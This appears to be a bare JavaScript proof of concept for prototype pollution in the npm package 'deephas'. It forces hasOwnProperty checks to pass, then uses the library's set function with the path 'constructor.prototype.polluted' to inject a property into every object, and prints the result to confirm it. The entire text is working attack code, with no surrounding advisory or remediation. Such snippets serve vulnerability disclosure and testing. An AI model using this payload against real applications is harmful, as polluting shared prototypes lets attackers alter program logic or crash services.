Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dh = require('deephas');
let obj = {};
dh.set(obj, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');